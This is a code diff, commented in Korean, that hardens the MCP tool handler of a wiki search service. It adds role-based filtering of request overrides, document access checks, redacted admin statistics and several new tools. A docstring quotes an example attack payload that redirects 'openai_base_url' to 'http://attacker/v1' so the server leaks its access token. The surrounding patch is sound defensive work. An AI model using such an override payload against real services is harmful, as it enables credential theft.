 
-def _query_with(pipe, question: str, k: Optional[int], mode: str, doc_types: Optional[List[str]], preset: Optional[str]):
-    """요청 범위(설정 사본·튜닝 오버레이) 안에서 질의 — 다른 클라이언트의 동시 호출과 격리된다."""
+def safe_overrides(pipe, overrides: Optional[Dict[str, Any]]) -> Dict[str, Any]:
+    """도구 인자로 온 overrides 를 **호출자의 역할로** 거른다 (llmwiki/auth.py 의 화이트리스트).
+
+    2026-09-19 이전에는 MCP 만 이 검사를 건너뛰었다. `/mcp` 는 read 등급이라 `anonymous_role` 이 켜져 있으면
+    무인증으로 `{"overrides": {"openai_base_url": "http://attacker/v1"}}` 를 보낼 수 있었고, 서버가 .env 의
+    PAT 를 그 주소로 보냈다 — Web 에서는 2026-09-18 에 막은 바로 그 구멍이 다른 문으로 남아 있었다.
+    stdio(로컬 운영자)는 actor 가 admin 이라 예전처럼 전부 허용된다."""
+    from . import auth as _auth      # noqa: F401 (AuthError 는 모듈 상단에서 이미 가져온다)
+    if not overrides:
+        return {}
+    role = (pipe.actor or {}).get("role") or "viewer"
+    cfg: Dict[str, Any] = {}
+    try:
+        cfg = _auth.load_security() or {}
+    except Exception:
+        cfg = {}
+    return _auth.filter_overrides(dict(overrides), role, cfg)
+
+
+def _query_with(pipe, question: str, k: Optional[int], mode: str, doc_types: Optional[List[str]], preset: Optional[str],
+                overrides: Optional[Dict[str, Any]] = None, output_mode: Optional[str] = None):
+    """요청 범위(설정 사본·튜닝 오버레이) 안에서 질의 — 다른 클라이언트의 동시 호출과 격리된다.
+    overrides 는 Web /api/query 의 overrides 와 **같은 길**이다: 같은 화이트리스트로 거르고(auth.filter_overrides)
+    request_scope → apply_overrides, overrides.tuning → 튜닝 오버레이."""
     names = [preset] if preset else []
-    ov = {"top_k_final": int(k)} if k else None
-    with pipe.request_scope(overrides=ov, presets=names, mode=mode or ""):
+    ov: Dict[str, Any] = dict(safe_overrides(pipe, overrides))
+    if k:
+        ov["top_k_final"] = int(k)
+    if output_mode:
+        ov["output_mode"] = str(output_mode)
+    with pipe.request_scope(overrides=ov or None, presets=names, mode=mode or ""):
         if doc_types:
             from . import tuning as _tn
             _tn.T.values["doc_type_boost"] = ",".join("%s:1.3" % d for d in doc_types)   # 오버레이에만 기록
@@ -362,10 +600,14 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
             st = {r["name"]: r for r in _mc.test_sources(pipe.s, [r["name"] for r in rows if r["enabled"]])}
             for r in rows:
                 r["status"] = st.get(r["name"])
+        with _FED_LOCK:
+            fed_errors = {k: v.get("error") for k, v in _FED_CACHE.items() if isinstance(v, dict) and v.get("error")}
         info = {"sources": rows, "external_rag": bool(pipe.s.toggles.external_rag), "mcp_federation": bool(getattr(pipe.s.toggles, "mcp_federation", False)),
                 "mcp_sources": bool(pipe.s.toggles.mcp_sources), "plugins": load_plugins(pipe.s),
                 "federated_tools": [t["name"] for t in fed],
-                "federation_errors": {k: v.get("error") for k, v in _FED_CACHE.items() if isinstance(v, dict) and v.get("error")}}
+                "federation_errors": fed_errors,
+                "duplicate_tools": duplicate_tools(),          # 이름이 겹쳐 tools/list 에서 버려진 도구
+                "mcp_config": {k: v for k, v in mcp_config().items() if k != "instructions"}}
         out = _text(json.dumps(info, ensure_ascii=False, indent=1, default=str))
         out["structuredContent"] = info
         return out
@@ -373,7 +615,7 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         from . import mcp_client as _mc
         q = str(args.get("query", ""))
         src = args.get("source")
-        rows = _mc.retrieve(pipe.s, q, int(args.get("k") or 5), names=[src] if src else None, include_fallback=True)
+        rows = _mc.retrieve(pipe.s, q, _cap_int(args, "k", 5, "max_k"), names=[src] if src else None, include_fallback=True)
         lines = ["외부 검색: %s%s" % (q, (" @ " + src) if src else "")]
         for r in rows:
             if r.get("error"):
@@ -384,7 +626,26 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         out["structuredContent"] = {"results": rows}
         return out
     if name == "wiki_query":
-        res, _ = _query_with(pipe, str(args.get("question", "")), args.get("k"), str(args.get("mode") or "normal"), args.get("doc_types"), args.get("preset"))
+        k_arg = _cap_int(args, "k", 0, "max_k") if args.get("k") not in (None, "") else None
+        ov = args.get("overrides") if isinstance(args.get("overrides"), dict) else None
+        try:
+            res, _ = _query_with(pipe, str(args.get("question", "")), k_arg, str(args.get("mode") or "normal"), args.get("doc_types"), args.get("preset"),
+                                 overrides=ov, output_mode=args.get("output_mode"))
+        except ValueError as e:      # overrides.tuning 의 모르는 키·범위 밖 값
+            return _err("invalid overrides: %s" % e)
+        omode = str(res.get("output_mode") or "answer")
+        if omode != "answer":
+            # 중간 산출물 모드: text 는 후보 표(마크다운) 또는 컨텍스트 본문, structuredContent 에 candidates/lists/stages 또는 context/refs
+            lines = [res["answer"], "", "output_mode: %s · result_type: %s · request_id: %s" % (omode, res.get("result_type"), res.get("request_id"))]
+            if omode == "context":
+                ev = res.get("evidence") or {}
+                lines.append("판정: %s · refs %d건" % (ev.get("verdict", "-"), len(res.get("refs") or [])))
+                sc = {k: res.get(k) for k in ("query", "output_mode", "result_type", "context", "refs", "evidence", "stages", "request_id", "run_id", "ms")}
+            else:
+                sc = {k: res.get(k) for k in ("query", "output_mode", "result_type", "candidates", "lists", "stages", "request_id", "run_id", "ms")}
+            out = _text("\n".join(lines))
+            out["structuredContent"] = sc
+            return out
         lines = [res["answer"], ""]
         ev = res.get("evidence") or {}
         lines.append("판정: %s · groundedness: %s · 모드: %s · fallback: %d회" % (ev.get("verdict", "-"), res.get("groundedness"), res.get("answer_mode"), len(res.get("fallback") or [])))
@@ -399,11 +660,30 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
                                                                   (" [외부 %s%s]" % (ext.get("source"), (" " + str(ext.get("url"))) if ext.get("url") else "")) if ext else "",
                                                                   h["heading"][:60], h["text"][:200].replace("\n", " ")))
         lines.append("request_id: %s · query_id: %s  (wiki_forensic / wiki_feedback 에 사용)" % (res.get("request_id"), res.get("query_id")))
-        return _text("\n".join(lines))
+        out = _text("\n".join(lines))
+        # 2026-09-19: 기본(answer) 모드에도 구조화 결과를 준다. 예전에는 output_mode 가 answer 가 **아닐 때만** 줘서,
+        # 정작 가장 많이 쓰는 경로에서 붙은 LLM 이 한국어 산문을 파싱해 인용을 되짚어야 했다 (다른 도구는 전부 주는데).
+        # 필드 이름은 Web `/api/query` 의 result 와 같게 맞춘다 — 창구마다 다른 이름을 외우게 하지 않는다.
+        out["structuredContent"] = {
+            "query": res.get("query"), "answer": res.get("answer"),
+            "output_mode": omode, "result_type": res.get("result_type"), "answer_mode": res.get("answer_mode"),
+            "groundedness": res.get("groundedness"), "evidence": res.get("evidence") or {},
+            "citations": [{"n": h.get("n"), "chunk_id": h.get("chunk_id"), "doc_id": h.get("doc_id"),
+                           "heading": h.get("heading"), "doc_type": h.get("doc_type"), "ext_id": h.get("ext_id"),
+                           "date": h.get("date"), "why": h.get("why")}
+                          for h in res.get("hits") or [] if h.get("in_context")],
+            "n_hits": len(res.get("hits") or []), "fallback": len(res.get("fallback") or []),
+            # LLM 실패 보고 — 붙은 LLM 이 "답이 왜 이 모양인지"(재시도 몇 번, timeout 몇 초, 무엇으로 대체했는지)를
+            # 산문에서 긁지 않고 읽을 수 있어야 한다. Web `/api/query` 의 result.llm_report 와 같은 모양이다.
+            "llm_report": res.get("llm_report"),
+            "request_id": res.get("request_id"), "query_id": res.get("query_id"),
+            "run_id": res.get("run_id"), "ms": res.get("ms"),
+        }
+        return out
     if name == "wiki_related":
         text = str(args.get("text", ""))
         types = args.get("doc_types") or ["issue", "cl"]
-        k = int(args.get("k") or 8)
+        k = _cap_int(args, "k", 8, "max_k")
         from .profiler import Profiler
         from .retrieval import fts_search, vector_search
         from .textutil import keywords
@@ -412,11 +692,14 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         rows = [(c, s_) for c, s_, _ in fts_search(pipe.store, q, k * 2, pipe.store.synonyms(), prof)]
         rows += vector_search(pipe.store, pipe.embedder, text[:2000], k * 2, prof)
         meta = pipe.store.doc_meta_map()
+        _af = pipe.acl_filter()          # 유사 문서 목록도 제목·ID 를 드러내므로 같은 판정을 건다 (docacl)
         seen: Dict[str, float] = {}
         for cid, s_ in rows:
             doc = cid.rsplit("#", 1)[0]
             dm = meta.get(doc) or {}
             if types and dm.get("doc_type") not in types:
+                continue
+            if _af.enabled and not _af.doc_ok(doc):
                 continue
             seen[doc] = seen.get(doc, 0.0) + 1.0
         docs = sorted(seen.items(), key=lambda kv: -kv[1])[:k]
@@ -437,10 +720,17 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         return _text("\n".join(lines))
     if name == "wiki_doc":
         ident = str(args.get("id", ""))
-        mx = int(args.get("max_chars") or 20000)
+        mx = _cap_int(args, "max_chars", int(_cfg_num("max_doc_chars", 20000)), "max_doc_chars")
         docs = pipe.store.docs_by_ext_id(ident.upper()) or [d["doc_id"] for d in pipe.store.list_docs() if ident in d["doc_id"]]
         if not docs:
             return _text("not found: %s" % ident)
+        # 문서 열람도 검색과 같은 출구다 — 여기서 막지 않으면 wiki_search 를 막아도 id 로 바로 읽힌다.
+        _af = pipe.acl_filter()
+        if _af.enabled:
+            docs = [d for d in docs if _af.doc_ok(d)]
+            if not docs:
+                return {"content": [{"type": "text", "text": "%s: %s (역할 %s)" % (
+                    _af.acl.get("deny_message") or "권한이 없는 문서입니다", ident, _af.role)}], "isError": True}
         doc_id = docs[0]
         chunks = pipe.store.all_chunks(doc_id)
         dm = pipe.store.get_doc_meta(doc_id) or {}
@@ -455,9 +745,11 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
                                                                      (pipe.store.get_entity(r["dst"]) or {}).get("name", r["dst"]), r.get("provenance")) for r in rels]
         return _text("\n".join(lines))
     if name == "wiki_propose":
+        from . import evolve as _ev
         kind = str(args.get("kind", ""))
-        if kind not in ("synonym", "alias", "entity", "relation", "wiki_note", "query_rule", "corpus_gap", "pin"):
-            return {"content": [{"type": "text", "text": "unsupported kind %s" % kind}], "isError": True}
+        # 종류 목록은 evolve.KINDS 한 곳에서 온다 (Web 드롭다운·apply 와 같은 목록)
+        if kind not in _ev.KINDS:
+            return {"content": [{"type": "text", "text": "unsupported kind %s — 가능: %s" % (kind, ", ".join(sorted(_ev.KINDS)))}], "isError": True}
         pid = pipe.store.add_proposal(kind, dict(args.get("payload") or {}), str(args.get("reason") or "mcp"), float(args.get("confidence") or 0.7), "mcp")
         return _text(json.dumps({"proposal_id": pid, "status": "proposed", "note": "사람 승인 필요: evolve apply %d" % pid}, ensure_ascii=False))
     if name == "wiki_feedback":
@@ -480,19 +772,62 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         out = _text(_fx.format_expectation(rep))
         out["structuredContent"] = {k: v for k, v in rep.items() if k in ("request_id", "query", "summary", "lost_counts", "suggestions", "best_target", "proposals", "forensic_id")}
         return out
+    if name == "wiki_evolve":
+        from . import evolve as _ev
+        st = str(args.get("status") or "proposed")
+        lim = _cap_int(args, "limit", 30, "max_k")
+        if args.get("id") is not None:
+            # 한 건 상세 — 설명 전문 (CLI `evolve show <id>` · Web /api/evolve/describe 와 같은 내용)
+            from . import proposal_explain as _pe
+            d = _ev.describe_proposal(pipe, int(args["id"]))
+            if d.get("error"):
+                return {"content": [{"type": "text", "text": "제안 #%s 없음" % args["id"]}], "isError": True}
+            one = _text(_pe.format_description(d))
+            one["structuredContent"] = d
+            return one
+        rows = pipe.store.proposals(st, lim)
+        explain = args.get("explain", True) is not False
+        exps = _ev.describe_proposals(pipe, rows) if explain else [None] * len(rows)
+        out = {"status": st, "n": len(rows),
+               "proposals": [dict({"id": r["id"], "kind": r["kind"], "confidence": r.get("confidence"),
+                                   "payload": r.get("payload"), "reason": r.get("reason"), "origin": r.get("origin"),
+                                   "ts": r.get("ts"), "status": r.get("status")},
+                                  **({"explain": {k: e[k] for k in ("title", "what", "target", "diff", "impact",
+                                                                    "checks", "applicable")}} if e else {}))
+                             for r, e in zip(rows, exps)],
+               "recent_log": pipe.store.evolution_log(15),
+               "auto_apply": bool(pipe.s.toggles.evolve_auto_apply),
+               "auto_apply_kinds": _ev.auto_apply_kinds(pipe.s),
+               "min_confidence": pipe.s.evolve_min_confidence,
+               "kinds": _ev.KINDS,
+               "note": "적용·거절은 사람이 합니다 — Web Evolve 탭 또는 `evolve apply <id>` / `evolve reject <id> 사유`"}
+        res = _text(json.dumps(out, ensure_ascii=False, indent=1, default=str))
+        res["structuredContent"] = {k: out[k] for k in ("status", "n", "auto_apply", "auto_apply_kinds", "min_confidence")}
+        return res
+    if name == "wiki_inspect":
+        from . import querydebug as _qd
+        d = _qd.inspect_query(pipe, str(args.get("query", "")))
+        res = _text(_qd.render_text(d))
+        res["structuredContent"] = d
+        return res
     if name == "wiki_search":
+        # CLI `search` · Web /api/search 와 **같은 엔진**(retrieval.channel_search) 을 쓴다.
         from .profiler import Profiler
-        from .retrieval import fts_search, vector_search, graph_search
-        ch, q, k = args.get("channel", "fts"), str(args.get("query", "")), int(args.get("k") or 8)
+        from .retrieval import channel_search, parse_channels
+        q, k = str(args.get("query", "")), _cap_int(args, "k", 8, "max_k")
+        chans = parse_channels(args.get("channels") if args.get("channels") is not None else args.get("channel", "fts"))
         prof = Profiler("search")
-        if ch == "fts":
-            out: Any = [{"chunk_id": c, "score": round(s, 3), "snippet": sn} for c, s, sn in fts_search(pipe.store, q, k, pipe.store.synonyms(), prof)]
-        elif ch == "vector":
-            out = [{"chunk_id": c, "score": round(s, 3)} for c, s in vector_search(pipe.store, pipe.embedder, q, k, prof)]
-        else:
-            g = graph_search(pipe.store, q, k, pipe.s.graph_hops, prof)
-            out = {"chunks": g["chunks"], "seeds": g.get("seeds"), "entities": g["entities"][:10], "relations": g["relations"][:10]}
-        return _text(json.dumps(out, ensure_ascii=False, indent=1))
+        out = channel_search(pipe.store, pipe.embedder, pipe.s, q, chans, mode=str(args.get("mode") or "or"), k=k, prof=prof,
+                             require=args.get("require"), exclude=args.get("exclude"),
+                             acl=pipe.acl_filter(),      # 문서 접근 제어 — Web /api/search 와 같은 판정 (docacl)
+                             doc_types=args.get("doc_types"))
+        res = _text(json.dumps(out, ensure_ascii=False, indent=1))
+        # 붙는 LLM 이 표를 다시 파싱하지 않도록 구조화 결과도 같이 준다
+        res["structuredContent"] = {"channels": out["channels"], "mode": out["mode"], "counts": out["counts"],
+                                    "rows": [{"chunk_id": r["chunk_id"], "score": r["score"], "n_channels": r["n_channels"],
+                                              "channels": sorted(r["channels"]), "doc_id": r.get("doc_id"),
+                                              "heading": r.get("heading")} for r in out["rows"]]}
+        return res
     if name == "wiki_entity":
         from .graph_rules import entity_id_for
         nm = str(args.get("name", ""))
@@ -506,10 +841,98 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         lines += ["관계:"] + ["- %s -[%s]-> %s (%s conf=%.2f %s)" % (r["src_name"], r["rel"], r["dst_name"], r.get("provenance") or "?", float(r.get("confidence") or 0), r.get("chunk_id") or "")
                             for r in d["relations"][:25]]
         return _text("\n".join(lines))
+    if name == "wiki_graph_rules":
+        # 그래프 빌드 규칙 (data/rules.json) — CLI `graph-rules` · Web /api/graph_rules 와 같은 내용
+        from . import graph_rules as _gr
+        act = str(args.get("action") or "types")
+        gr_rules = _gr.load_rules()
+        if act == "lint":
+            r = _gr.lint(gr_rules)
+            out = _text(json.dumps(r, ensure_ascii=False, indent=1))
+            out["structuredContent"] = {"counts": r["counts"], "n_issues": len(r["issues"])}
+            return out
+        if act == "test":
+            q = str(args.get("q") or "").strip()
+            if not q:
+                return _err("action=test 에는 q(문장) 가 필요합니다")
+            ex = _gr.RuleExtractor(gr_rules)
+            dm = {"doc_type": str(args.get("doc_type") or ""), "ext_id": str(args.get("ext_id") or "")}
+            ents, cnts, rels = ex.extract_chunk(q, "", "test", "테스트 문서", dm if (dm["doc_type"] or dm["ext_id"]) else None)
+            r = {"entities": [{"name": e.name, "type": e.type, "mentions": cnts.get(k, 0)} for k, e in ents.items()],
+                 "relations": [{"src": ents[x.src].name if x.src in ents else x.src, "rel": x.rel,
+                                "dst": ents[x.dst].name if x.dst in ents else x.dst,
+                                "provenance": x.provenance, "weight": x.weight} for x in rels],
+                 "unknown_rels": ex.schema.unknown_rels, "unknown_types": ex.schema.unknown_types}
+            out = _text(json.dumps(r, ensure_ascii=False, indent=1))
+            out["structuredContent"] = {"n_entities": len(r["entities"]), "n_relations": len(r["relations"])}
+            return out
+        types = _gr.known_types(gr_rules)
+        schema = _gr.Schema(gr_rules.get("schema"), types)
+        r = {"entity_types": types, "value_types": _gr.describe_value_types(),
+             "relations": schema.relations, "on_unknown": schema.on_unknown,
+             "n_entities": len(gr_rules.get("entities") or {}),
+             "note": "값 종류는 relation_patterns[*].value 와 chunk_values[*].value 에 쓴다. "
+                     "관계 어휘 밖의 이름은 on_unknown 정책대로 처리되고 빌드 보고서에 남는다. "
+                     "규칙 추가는 wiki_propose 의 entity/alias 제안으로 (사람이 승인)."}
+        out = _text(json.dumps(r, ensure_ascii=False, indent=1))
+        out["structuredContent"] = {"n_types": len(types), "n_value_types": len(r["value_types"]),
+                                    "n_relations": len(schema.relations), "on_unknown": schema.on_unknown}
+        return out
+    if name == "wiki_rules":
+        from . import query_rules as _qr
+        from . import tuning as _tn
+        act = str(args.get("action") or "explain")
+        if act == "types":
+            # 규칙 유형 표 — 붙은 LLM 이 "이 말을 어느 유형에 넣자" 를 제안할 때 근거가 된다 (제안은 wiki_propose).
+            rows = _qr.describe_types()
+            out = _text(json.dumps({"types": rows, "n": len(rows),
+                                    "note": "유형마다 적용 방식이 다릅니다. 완전 동치=acronym · 비슷=synonym · 표기=alias · 곁가지=related · "
+                                            "잡음=exclude · 붙여쓰기=compound · 문맥마다 뜻이 갈림=context · 분류체계=hypernym · 숫자+단위=unit"},
+                                   ensure_ascii=False, indent=1))
+            out["structuredContent"] = {"types": rows, "n": len(rows)}
+            return out
+        if act == "test":
+            q = str(args.get("q") or "").strip()
+            if not q:
+                return _err("action=test 에는 q(질의) 가 필요합니다")
+            r = _qr.expand(q, _tn.T.get("syn_w"), _tn.T.get("related_w"), _tn.T.get("acronym_phrase"))
+            out = _text(json.dumps(r, ensure_ascii=False, indent=1))
+            out["structuredContent"] = r
+            return out
+        term = str(args.get("term") or "").strip()
+        if not term:
+            return _err("action=explain 에는 term(용어) 이 필요합니다")
+        r = _qr.explain(term)
+        from .cli import _rules_explain_text
+        out = _text(_rules_explain_text(r))
+        out["structuredContent"] = r
+        return out
+    if name == "wiki_graph_profile":
+        from . import graph_profile as _gp
+        prof = _gp.profile(pipe, include_eval=bool(args.get("eval")))
+        prof["saved"] = _gp.save(prof)
+        if args.get("compare"):
+            hist = _gp.history(pipe.s)
+            prev = _gp.load(hist[1]["path"]) if len(hist) > 1 else None
+            prof["compare"] = _gp.compare(prev, prof) if prev else None
+        out = _text(_gp.render_text(prof))
+        out["structuredContent"] = prof
+        return out
     if name == "wiki_status":
-        return _text(json.dumps({"stats": pipe.store.stats(), "providers": {k: v for k, v in pipe.provider_status().items() if k not in ("catalog", "agents")},
-                                 "doc_types": pipe.store.doc_type_counts(), "provenance": pipe.store.provenance_counts()},
-                                ensure_ascii=False, indent=1, default=str))
+        out = {"stats": pipe.store.stats(), "providers": {k: v for k, v in pipe.provider_status().items() if k not in ("catalog", "agents")},
+               "doc_types": pipe.store.doc_type_counts(), "provenance": pipe.store.provenance_counts()}
+        if args.get("full"):
+            # 운영 통계 — CLI `stats --full` · Web 옵저빌리티 › 시스템 과 같은 함수 (읽기 전용)
+            from . import opstats as _ops
+            secs = args.get("sections") or None
+            # 호출자 역할로 가린다 — `users` 절은 admin 만(Web `/api/opstats` · `/api/query_users` 와 같은 기준).
+            # 붙은 LLM 이 API 키 역할을 넘어 "누가 얼마나 썼나" 를 보면 안 된다 (2026-09-20 정렬 감사).
+            out["ops"] = _ops.redact(
+                _ops.collect(pipe, days=float(args.get("days") or 7),
+                             sections=list(secs) if secs else None, top=_cap_int(args, "top", 8, "max_k"),
+                             bucket=str(args.get("bucket") or "day")),
+                admin=((pipe.actor or {}).get("role") == "admin"))
+        return _text(json.dumps(out, ensure_ascii=False, indent=1, default=str))
     if name == "wiki_requests":
         rid = int(args.get("request_id") or 0)
         if rid:
@@ -531,6 +954,32 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
         out = _text(json.dumps(brief, ensure_ascii=False, indent=1, default=str))
         out["structuredContent"] = {"count": len(brief)}
         return out
+    if name == "wiki_sweep":
+        from . import sweep as _sw
+        from . import rerun as _rr
+        key = str(args.get("key") or "").strip()
+        if not key:
+            # 키 없이 부르면 **무엇을 스윕할 수 있는지** 알려 준다 (wiki_rerun 의 인자 없는 호출과 같은 관례)
+            keys = [{k: d.get(k) for k in ("key", "kind", "type", "min", "max", "choices", "default", "point")} for d in _sw.sweepable_keys(pipe.s)]
+            body = {"keys": keys, "points": [{k: p[k] for k in ("id", "label")} for p in _rr.POINTS], "saved": _rr.list_saved(pipe.s, 10),
+                    "max_values": int(getattr(pipe.s, "sweep_max_values", 20) or 20),
+                    "how": "key 와 values(또는 range) 를 주고 다시 부르세요. request_id 를 생략하면 마지막 저장 요청이 기준입니다."}
+            out = _text(json.dumps(body, ensure_ascii=False, indent=1, default=str))
+            out["structuredContent"] = {"n_keys": len(keys), "max_values": body["max_values"]}
+            return out
+        rid = args.get("request_id")
+        rid = None if rid in (None, "", "last") else rid
+        try:
+            spec = {"range": args["range"]} if args.get("range") else ({"values": args["values"]} if args.get("values") is not None else None)
+            vals = _sw.resolve_values(key, spec, int(getattr(pipe.s, "sweep_max_values", 20) or 20))
+            rec = _sw.run(pipe, rid if rid is not None else "last", key, vals, repeats=int(args.get("repeats") or 1),
+                          from_point=str(args.get("from") or "") or None, log=False)
+        except ValueError as e:
+            return _err(str(e))
+        cmp_ = _sw.compare(rec)
+        out = _text(_sw.render_text(rec, cmp_))
+        out["structuredContent"] = {"record": _sw.brief(rec, 2000), "compare": cmp_}
+        return out
     if name == "wiki_rerun":
         from . import rerun as _rr
         rid = int(args.get("request_id") or 0)
@@ -541,7 +990,7 @@ def call_tool(pipe, name: str, args: Dict[str, Any], federate: bool = True) -> D
                                      "how": "request_id 와 from 을 주고 다시 부르세요. overrides 로 이번 실행에만 설정을 바꿀 수 있습니다."},
                                     ensure_ascii=False, indent=1, default=str))
         point = str(args.get("from") or "answer_llm")
-        ov = args.get("overrides") if isinstance(args.get("overrides"), dict) else None
+        ov = safe_overrides(pipe, args.get("overrides") if isinstance(args.get("overrides"), dict) else None)
         try:
             with pipe.request_scope(overrides=ov or None):
                 res, tr = pipe.rerun(rid, point, log=True)
@@ -590,6 +1039,10 @@ def handle(pipe, msg: Dict[str, Any], federate: bool = True) -> Optional[Dict[st
     if method == "tools/call":
         try:
             res = call_tool(pipe, params.get("name", ""), params.get("arguments") or {}, federate=federate)
+        except AuthError as e:
+            # 권한 거부(예: overrides 화이트리스트)는 **왜 거부됐는지**를 그대로 돌려준다 — 붙은 LLM 이
+            # 인자를 고쳐 다시 부를 수 있어야 한다 (validate_args 의 오류 메시지와 같은 관례).
+            res = {"content": [{"type": "text", "text": "권한 거부(%d): %s" % (e.status, e.error)}], "isError": True}
         except Exception as e:  # 도구 오류는 isError 로
             res = {"content": [{"type": "text", "text": "error: %s" % e}], "isError": True}
         return {"jsonrpc": "2.0", "id": mid, "result": res}
